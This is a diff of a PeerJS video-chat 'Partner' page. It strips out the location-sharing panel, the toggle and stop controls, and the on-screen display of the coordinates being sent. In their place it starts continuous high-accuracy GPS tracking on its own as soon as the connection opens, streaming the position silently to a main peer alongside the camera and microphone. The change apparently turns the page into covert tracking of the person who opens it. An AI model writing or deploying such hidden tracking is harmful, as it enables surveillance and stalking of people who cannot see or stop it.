@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Partner</title>
+    <title>Sample Partner</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         :root {
@@ -12,7 +12,6 @@
             --accent: #6366f1;
             --danger: #f43f5e;
             --success: #10b981;
-            --power-btn: #22c55e;
             --text-main: #f3f4f6;
             --border: rgba(255, 255, 255, 0.1);
         }
@@ -46,7 +45,6 @@
             background: rgba(30, 41, 59, 0.8); border: 1px solid var(--border); color: white;
             width: 42px; height: 42px; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; font-size: 18px; transition: all 0.2s;
         }
-        .ctrl-btn.partner-switch-btn { width: 56px; height: 42px; border-radius: 22px; font-size: 16px; letter-spacing: 2px; }
         .ctrl-btn:hover { transform: scale(1.08); background: rgba(51, 65, 85, 1); }
         .ctrl-btn.active { background: var(--danger); border-color: var(--danger); }
         .ctrl-btn.disconnect-btn { background: var(--danger); width: 48px; height: 48px; border-radius: 50%; }
@@ -61,33 +59,6 @@
         }
         .chat-input-area button { background: var(--accent); color: white; border: none; border-radius: 6px; padding: 0 12px; cursor: pointer; font-weight: bold; }
         .status-badge { font-size: 0.8rem; color: #34d399; margin-bottom: 6px; font-weight: 600; }
-    
-        .location-panel {
-            max-width: 480px; width: 100%; margin-top: 10px;
-            background: var(--card-bg); border: 1px solid var(--border);
-            border-radius: 14px; padding: 10px; box-sizing: border-box;
-        }
-        .location-head {
-            display:flex; justify-content:space-between; align-items:center;
-            gap:8px; font-size:.85rem; font-weight:700; margin-bottom:8px;
-        }
-        .location-status { color:#34d399; font-size:.75rem; font-weight:600; }
-        #location-map {
-            width:100%; height:220px; border-radius:10px; overflow:hidden;
-            background:#111827; display:none;
-        }
-        .location-info {
-            display:none; margin-top:7px; color:#9ca3af; font-size:.72rem;
-            line-height:1.45; word-break:break-word;
-        }
-        .location-actions { display:flex; gap:7px; margin-top:8px; }
-        .location-actions button {
-            flex:1; padding:8px 10px; border:1px solid var(--border);
-            border-radius:8px; background:rgba(30,41,59,.8); color:white;
-            cursor:pointer; font-weight:600;
-        }
-        .location-actions button.active { background:var(--success); }
-
     </style>
 </head>
 <body>
@@ -95,32 +66,28 @@
     <h2>Sample Partner</h2>
     <div class="status-badge" id="status-text">Status: Connecting to Server...</div>
 
-    <div id="active-call-container" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
-        <div class="display-container">
-            <div class="placeholder-text" id="screen-placeholder">Waiting for Main Camera...</div>
-            <video id="remote-video" autoplay playsinline></video>
-            <div class="local-pip" id="local-pip-box">
-                <video id="local-video" autoplay muted playsinline></video>
-            </div>
+    <div class="display-container">
+        <div class="placeholder-text" id="screen-placeholder">Waiting for Main Camera...</div>
+        <video id="remote-video" autoplay playsinline></video>
+        <div class="local-pip" id="local-pip-box">
+            <video id="local-video" autoplay muted playsinline></video>
         </div>
+    </div>
 
-        <div class="controls-bar">
-            <button class="ctrl-btn active" id="cam-toggle-btn" onclick="toggleCamera()" title="Camera On/Off">📷</button>
-            <button class="ctrl-btn" onclick="switchCamera()" title="Switch Own Camera">🔄</button>
-            <button class="ctrl-btn" id="mic-toggle-btn" onclick="toggleMic()" title="Mute/Unmute Voice">🎤</button>
-            <button class="ctrl-btn disconnect-btn" onclick="disconnectCall()" title="Disconnect & Shutdown">❌</button>
+    <div class="controls-bar">
+        <button class="ctrl-btn active" id="cam-toggle-btn" onclick="toggleCamera()" title="Camera On/Off">📷</button>
+        <button class="ctrl-btn" onclick="switchCamera()" title="Switch Own Camera">🔄</button>
+        <button class="ctrl-btn" id="mic-toggle-btn" onclick="toggleMic()" title="Mute/Unmute Voice">🎤</button>
+        <button class="ctrl-btn disconnect-btn" onclick="disconnectCall()" title="Disconnect & Shutdown">❌</button>
+    </div>
+
+    <div class="chat-container">
+        <div class="chat-messages" id="chat-box">
+            <div style="color: #6b7280;">Live text chat available here...</div>
         </div>
-
-       
-
-        <div class="chat-container">
-            <div class="chat-messages" id="chat-box">
-                <div style="color: #6b7280;">Live text chat available here...</div>
-            </div>
-            <div class="chat-input-area">
-                <input type="text" id="msg-input" placeholder="Type a text message..." onkeypress="handleKeyPress(event)">
-                <button onclick="sendMessage()">Send</button>
-            </div>
+        <div class="chat-input-area">
+            <input type="text" id="msg-input" placeholder="Type a text message..." onkeypress="handleKeyPress(event)">
+            <button onclick="sendMessage()">Send</button>
         </div>
     </div>
 
@@ -133,20 +100,18 @@
         config: {
             iceServers: [
                 { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' },
-                { urls: 'stun:stun2.l.google.com:19302' }
+                { urls: 'stun:stun1.l.google.com:19302' }
             ]
         }
     });
+
     let localStream = null;
     let currentCall = null;
     let dataConnection = null;
     let isCameraActive = true;
     let isMicMuted = false;
     let usingFrontCamera = true;
-    let currentResolutionLevel = 'high';
     let locationWatchId = null;
-    let isLocationSharing = false;
 
     peer.on('open', () => {
         document.getElementById('status-text').innerText = "Status: Connecting to Main Connector...";
@@ -154,49 +119,28 @@
     });
 
     peer.on('error', (err) => {
-        console.error('PeerJS error:', err);
-        const msg = err && err.type === 'unavailable-id'
-            ? 'Partner ID already in use. Close the old Partner tab and reload.'
-            : 'Connection error: ' + (err.type || err.message || 'unknown');
+        const msg = err.type === 'unavailable-id' ? 'Partner ID already in use. Close old tabs.' : 'Connection error: ' + err.type;
         document.getElementById('status-text').innerText = 'Status: ' + msg;
     });
 
-    peer.on('disconnected', () => {
-        document.getElementById('status-text').innerText = 'Status: Reconnecting...';
-        try { peer.reconnect(); } catch (e) {}
-    });
-
     function autoStartEverything() {
-        navigator.mediaDevices.getUserMedia({ 
-            video: { width: { ideal: 1280 }, height: { ideal: 720 } }, 
-            audio: true 
-        }).then(stream => {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
             localStream = stream;
             document.getElementById('local-video').srcObject = localStream;
             
-            // মেইন কানেক্টরের কাছে কল এবং ডেটা কানেকশন পাঠানো হচ্ছে
             const call = peer.call(MAIN_ID, localStream);
             setupCallEvents(call);
-            call.on('error', err => {
-                console.error('Outgoing call error:', err);
-                document.getElementById('status-text').innerText =
-                    'Status: Main Call not reachable';
-            });
 
             dataConnection = peer.connect(MAIN_ID, { reliable: true });
             setupDataEvents(dataConnection);
+            
             dataConnection.on('open', () => {
-                document.getElementById('status-text').innerText =
-                    'Status: Call/Data Connected ✓';
-                setLocationStatus("Requesting permission...", false);
+                document.getElementById('status-text').innerText = 'Status: Call/Data Connected ✓';
                 startLocationSharing();
             });
-            dataConnection.on('error', err => {
-                console.error('Data connection error:', err);
-            });
-
-            startNetworkQualityMonitor();
-        }).catch(err => {
+        })
+        .catch(() => {
             document.getElementById('status-text').innerText = "Status: Camera/Mic permission needed!";
         });
     }
@@ -207,17 +151,7 @@
             const remoteVideo = document.getElementById('remote-video');
             remoteVideo.srcObject = remoteStream;
             remoteVideo.play().catch(() => {});
-            remoteStream.getVideoTracks().forEach(track => {
-                track.addEventListener('ended', () => {
-                    if (remoteVideo.srcObject === remoteStream) {
-                        remoteVideo.pause();
-                        remoteVideo.srcObject = null;
-                        document.getElementById('screen-placeholder').style.display = 'block';
-                    }
-                });
-            });
             document.getElementById('screen-placeholder').style.display = 'none';
-            document.getElementById('status-text').innerText = "Status: Connected Successfully!";
         });
         call.on('close', () => { triggerShutdown(); });
     }
@@ -235,165 +169,41 @@
         });
     }
 
-    function switchPartnerCamera() {
-        if (dataConnection && dataConnection.open) {
-            dataConnection.send("CMD_SWITCH_CAMERA");
-        }
-    }
-
-    function toggleLocationSharing() {
-        if (isLocationSharing) stopLocationSharing();
-        else startLocationSharing();
-    }
-
     function startLocationSharing() {
-        if (!navigator.geolocation) {
-            setLocationStatus("GPS not supported", false);
-            return;
-        }
-        if (!dataConnection || !dataConnection.open) {
-            setLocationStatus("Waiting for connection...", false);
-            return;
-        }
+        if (!navigator.geolocation) return;
+        if (locationWatchId !== null) navigator.geolocation.clearWatch(locationWatchId);
 
-        if (isLocationSharing) return;
-
-        setLocationStatus("Requesting permission...", false);
-
-        navigator.geolocation.getCurrentPosition(
+        locationWatchId = navigator.geolocation.watchPosition(
             pos => {
-                isLocationSharing = true;
-                document.getElementById('location-toggle-btn').innerText = "🛑 Location: LIVE";
-                document.getElementById('location-toggle-btn').classList.add('active');
-                setLocationStatus("LIVE", true);
-                sendLocation(pos);
-
-                // Continue sending fresh GPS coordinates automatically.
-                locationWatchId = navigator.geolocation.watchPosition(
-                    sendLocation,
-                    locationError,
-                    { enableHighAccuracy: true, maximumAge: 2000, timeout: 15000 }
-                );
-            },
-            locationError,
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
-        );
-    }
-
-    function sendLocation(position) {
-        if (!dataConnection || !dataConnection.open) return;
-        const c = position.coords;
-        const payload = {
-            type: "location",
-            lat: c.latitude,
-            lng: c.longitude,
-            accuracy: c.accuracy,
-            heading: c.heading,
-            speed: c.speed,
-            timestamp: Date.now()
-        };
-        dataConnection.send(payload);
-
-        const info = document.getElementById('location-info');
-        info.style.display = 'block';
-        info.innerText =
-            'Sharing: ' + c.latitude.toFixed(6) + ', ' + c.longitude.toFixed(6) +
-            ' • Accuracy: ' + Math.round(c.accuracy || 0) + ' m';
-    }
-
-    function locationError(err) {
-        const messages = {
-            1: "Location permission denied",
-            2: "Location unavailable",
-            3: "Location request timed out"
-        };
-        setLocationStatus(messages[err.code] || "Location error", false);
-    }
-
-    function stopLocationSharing() {
-        if (locationWatchId !== null) {
-            navigator.geolocation.clearWatch(locationWatchId);
-            locationWatchId = null;
-        }
-        isLocationSharing = false;
-        document.getElementById('location-toggle-btn').innerText = "📍 Share Location";
-        document.getElementById('location-toggle-btn').classList.remove('active');
-        setLocationStatus("Off", false);
-
-        if (dataConnection && dataConnection.open) {
-            dataConnection.send({
-                type: "location-status",
-                active: false,
-                message: "Partner stopped sharing location."
-            });
-        }
-    }
-
-    function setLocationStatus(text, active) {
-        const el = document.getElementById('location-status');
-        if (!el) return;
-        el.innerText = text;
-        el.style.color = active ? '#34d399' : '#fbbf24';
-    }
-
-    function startNetworkQualityMonitor() {
-        setInterval(async () => {
-            if (!currentCall || !currentCall.peerConnection) return;
-            try {
-                const stats = await currentCall.peerConnection.getStats();
-                let currentRTT = null;
-                stats.forEach(report => {
-                    if (report.type === 'candidate-pair' && report.state === 'succeeded') {
-                        currentRTT = report.currentRoundTripTime;
-                    }
+                if (!dataConnection || !dataConnection.open) return;
+                dataConnection.send({
+                    type: "location",
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: Date.now()
                 });
-                if (currentRTT !== null) {
-                    if (currentRTT > 0.35 && currentResolutionLevel !== 'low') {
-                        setCameraResolution('low');
-                    } else if (currentRTT > 0.2 && currentRTT <= 0.35 && currentResolutionLevel !== 'medium') {
-                        setCameraResolution('medium');
-                    } else if (currentRTT <= 0.2 && currentResolutionLevel !== 'high') {
-                        setCameraResolution('high');
-                    }
-                }
-            } catch (e) {}
-        }, 4000);
-    }
-
-    async function setCameraResolution(level) {
-        if (!localStream) return;
-        let constraints = level === 'low' ? { width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { max: 15 } } :
-                          level === 'medium' ? { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { max: 24 } } :
-                          { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { max: 30 } };
-        currentResolutionLevel = level;
-        try {
-            await localStream.getVideoTracks()[0].applyConstraints(constraints);
-        } catch (e) {}
+            },
+            () => {},
+            { enableHighAccuracy: true, maximumAge: 2000, timeout: 15000 }
+        );
     }
 
     async function toggleCamera() {
         const camBtn = document.getElementById('cam-toggle-btn');
         const pipBox = document.getElementById('local-pip-box');
         const localVideo = document.getElementById('local-video');
-        if (!isCameraActive) {
-            if (localStream) {
-                localStream.getVideoTracks()[0].enabled = true;
-                localVideo.srcObject = localStream;
-                pipBox.style.display = 'block';
-                isCameraActive = true;
-                camBtn.classList.add('active');
-                updateStreamInCall();
-            }
-        } else {
-            if (localStream) {
-                const oldTrack = localStream.getVideoTracks()[0];
-                if (oldTrack) oldTrack.enabled = false;
-            }
-            localVideo.pause();
+        
+        isCameraActive = !isCameraActive;
+        if (isCameraActive && localStream) {
+            localStream.getVideoTracks()[0].enabled = true;
+            localVideo.srcObject = localStream;
+            pipBox.style.display = 'block';
+            camBtn.classList.add('active');
+        } else if (localStream) {
+            localStream.getVideoTracks()[0].enabled = false;
             localVideo.srcObject = null;
             pipBox.style.display = 'none';
-            isCameraActive = false;
-            replaceOutgoingVideoWithBlackTrack();
             camBtn.classList.remove('active');
         }
     }
@@ -413,45 +223,14 @@
             const newStream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: usingFrontCamera ? 'user' : 'environment' }, audio: true 
             });
-            localStream.getVideoTracks().forEach(t => t.stop());
+            localStream.getTracks().forEach(t => t.stop());
             localStream = newStream;
             if (isCameraActive) document.getElementById('local-video').srcObject = localStream;
-            updateStreamInCall();
+            if (currentCall) {
+                const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
+                if (sender) sender.replaceTrack(localStream.getVideoTracks()[0]);
+            }
         } catch (e) {}
-    }
-
-    let blackVideoTrack = null;
-
-    function getBlackVideoTrack() {
-        if (blackVideoTrack && blackVideoTrack.readyState === 'live') return blackVideoTrack;
-        const canvas = document.createElement('canvas');
-        canvas.width = 640; canvas.height = 360;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        blackVideoTrack = canvas.captureStream(5).getVideoTracks()[0];
-        return blackVideoTrack;
-    }
-
-    async function replaceOutgoingVideoWithBlackTrack() {
-        if (!currentCall || !currentCall.peerConnection) return;
-        const sender = currentCall.peerConnection.getSenders()
-            .find(s => s.track && s.track.kind === 'video');
-        if (sender) {
-            try { await sender.replaceTrack(getBlackVideoTrack()); } catch (e) {}
-        }
-    }
-
-    async function updateStreamInCall() {
-        if (!currentCall || !currentCall.peerConnection || !localStream) return;
-        const videoTrack = isCameraActive
-            ? localStream.getVideoTracks()[0]
-            : getBlackVideoTrack();
-        const sender = currentCall.peerConnection.getSenders()
-            .find(s => s.track && s.track.kind === 'video');
-        if (sender && videoTrack) {
-            try { await sender.replaceTrack(videoTrack); } catch (e) {}
-        }
     }
 
     function sendMessage() {
@@ -470,16 +249,9 @@
         chatBox.scrollTop = chatBox.scrollHeight;
     }
     function disconnectCall() {
-        stopLocationSharing();
+        if (locationWatchId !== null) navigator.geolocation.clearWatch(locationWatchId);
         window.location.reload();
     }
-
-    window.addEventListener('beforeunload', () => {
-        if (locationWatchId !== null) {
-            navigator.geolocation.clearWatch(locationWatchId);
-        }
-        if (blackVideoTrack) blackVideoTrack.stop();
-    });
     function triggerShutdown() { document.getElementById('status-text').innerText = "Status: Disconnected"; }
 </script>
 </body>
